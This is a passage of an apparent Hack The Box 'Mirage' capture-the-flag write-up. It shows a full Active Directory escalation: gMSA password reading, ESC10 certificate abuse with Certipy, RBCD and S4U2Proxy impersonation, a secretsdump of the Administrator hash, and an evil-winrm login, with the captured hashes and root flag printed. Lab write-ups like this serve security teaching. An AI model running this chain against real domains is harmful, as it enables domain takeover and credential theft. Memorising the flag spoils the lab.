+└─$ bloodyAD -k --host &#39;10.129.6.26&#39; -d &#39;mirage.htb&#39; -u &#39;javier.mmarshall&#39; -p &#39;Newpassword123&#39; --host dc01.mirage.htb get object &#39;Mirage-Service$&#39; --attr msDS-ManagedPassword  
+
+distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
+msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==
+</code></pre><h2 id="esc10--weak-certificate-mapping-for-schannel-authentication">ESC10 – Weak Certificate Mapping for Schannel Authentication</h2>
+<p>During my investigation into privilege escalation via AD CS, I used <strong>ESC10</strong>, which exploits weak certificate mapping to enable authentication via Schannel. I have outlined the entire chain step by step below. You can use the article below for this purpose. <a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication</a></p>
+<p>First, we will request a TGT for the user whose hash we just cracked. Once the ticket has been created, we can export it so that we can use it for authentication. Once the export is complete, you will change the UPN <code>mark.bbond</code> to that of the domain controller.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ impacket-getTGT -dc-ip 10.129.6.26 mirage.htb/&#39;Mirage-Service$&#39; -hashes &#39;:305806d84f7c1be93a07aaf40f0c7866&#39; -k
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Mirage-Service$.ccache
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ export KRB5CCNAME=Mirage-Service$.ccache
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ certipy account update \
+  -user &#39;mark.bbond&#39; \
+  -upn &#39;dc01$@mirage.htb&#39; \
+  -u &#39;mirage-service$@mirage.htb&#39; \
+  -k -no-pass \
+  -dc-ip 10.129.6.26 \
+  -target dc01.mirage.htb
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user &#39;mark.bbond&#39;:
+    userPrincipalName                   : dc01$@mirage.htb
+[*] Successfully updated &#39;mark.bbond&#39;
+</code></pre><p>You will now export the <code>.ccache</code> file from <code>mark.bbond</code> because we have changed the authentication.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ export KRB5CCNAME=mark.bbond.ccache
+</code></pre><p>After changing the authentication, I will request a certificate called <code>mirage-DC01-CA</code> using the <code>user</code> template. The certificate and private key will be stored in the <code>dc01.pfx</code> file.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ certipy req -u mark.bbond@mirage.htb -no-pass -k -ca mirage-DC01-CA -template User -dc-ip 10.129.6.26 -dc-host dc01.mirage.htb
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 10
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;dc01$@mirage.htb&#39;
+[*] Certificate object SID is &#39;S-1-5-21-2127163471-3824721834-2568365109-1109&#39;
+[*] Saving certificate and private key to &#39;dc01.pfx&#39;
+[*] Wrote certificate and private key to &#39;dc01.pfx&#39;
+</code></pre><p>export <code>.ccache</code> from mirage service</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ export KRB5CCNAME=Mirage-Service$.ccache
+</code></pre><p>I will reset <code>mark.bbond</code> UPN to its original UPN name and email address.</p>
+<pre tabindex="0"><code>──(kali㉿kali)-[~/HTB/Mirage]
+└─$ certipy-ad account \       
+  -u &#39;mirage-service$&#39; \
+  -k -no-pass \
+  -target &#39;dc01.mirage.htb&#39; \
+  -upn &#39;mark.bbond@mirage.htb&#39; \
+  -user &#39;mark.bbond&#39; \
+  update
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc01.mirage.htb.
+[!] Use -debug to print a stacktrace
+[*] Updating user &#39;mark.bbond&#39;:
+    userPrincipalName                   : mark.bbond@mirage.htb
+[*] Successfully updated &#39;mark.bbond&#39;
+</code></pre><p>I am going to use the .pfx file I just created to connect to the LDAP server via Schannel-authentication.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ certipy auth -pfx dc01.pfx -dc-ip 10.129.6.26 -ldap-shell
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;dc01$@mirage.htb&#39;
+[*]     Security Extension SID: &#39;S-1-5-21-2127163471-3824721834-2568365109-1109&#39;
+[*] Connecting to &#39;ldaps://10.129.6.26:636&#39;
+wh[*] Authenticated to &#39;10.129.6.26&#39; as: &#39;u:MIRAGE\\DC01$&#39;
+Type help for list of commands
+
+# whoami
+u:MIRAGE\DC01$
+</code></pre><p>During my attack chain, I used the command <code>set_rbcd dc01$ Mirage-Service$</code> to enable Resource-Based Constrained Delegation (RBCD). This ensured that the <code>Mirage-Service$</code> account was authorized to impersonate users on the machine <code>dc01$</code>, the domain controller.</p>
+<pre tabindex="0"><code># set_rbcd dc01$ Mirage-Service$
+Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
+Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000
+
+Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
+Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
+Delegation rights modified successfully!
+Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy
+</code></pre><p>I wanted to obtain a Kerberos service ticket for the account <code>dc01$</code> (the domain controller) using the previously obtained account <code>Mirage-Service$</code>, on which I had set up RBCD (Resource-Based Constrained Delegation). My goal was to use <code>Mirage-Service$</code> to impersonate <code>dc01$</code> via <strong>S4U2Proxy</strong>, so that I could access the domain controller as a system account.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ impacket-getTGT -dc-ip 10.129.6.26 &#34;mirage.htb/Mirage-Service$&#34; -hashes :305806d84f7c1be93a07aaf40f0c7866
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Mirage-Service$.ccache
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ export KRB5CCNAME=&#39;Mirage-Service$.ccache&#39;
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ impacket-getST -spn &#39;cifs/dc01.mirage.htb&#39; -impersonate &#39;dc01$&#39; -dc-ip 10.129.6.26  &#39;mirage.htb/Mirage-Service$&#39; -k -no-pass
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating dc01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
+</code></pre><p>Export the newly created .ccache file, then dump the administrator hash and use it to create the Administrator .ccache file.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ KRB5CCNAME=&#39;dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache&#39;
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ impacket-secretsdump &#39;dc01$&#39;@dc01.mirage.htb -k -no-pass -dc-ip 10.129.6.26 -just-dc-user administrator
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
+[*] Kerberos keys grabbed
+mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
+mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
+mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
+[*] Cleaning up... 
+</code></pre><p>Obtain the admin ccache, export for authentication, and then log in as admin.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ impacket-getTGT -dc-ip 10.129.6.26 &#34;mirage.htb/Administrator&#34; -hashes &#39;:7be6d4f3c2b9c0e3560f5a29eeb1afb3&#39;
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Administrator.ccache
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ export KRB5CCNAME=Administrator.ccache
+
+┌──(kali㉿kali)-[~/HTB/Mirage]
+└─$ evil-winrm -i dc01.mirage.htb -r mirage.htb
+</code></pre><p>As you can see, I am now logged in as administrator and we can proceed to obtain the root flag.</p>
+<p>root flag: eab21331876244aec534137ec32dd24f</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         7/23/2025   7:08 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+eab21331876244aec534137ec32dd24f
+</code></pre><p>![[Pasted image 20250725094924.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
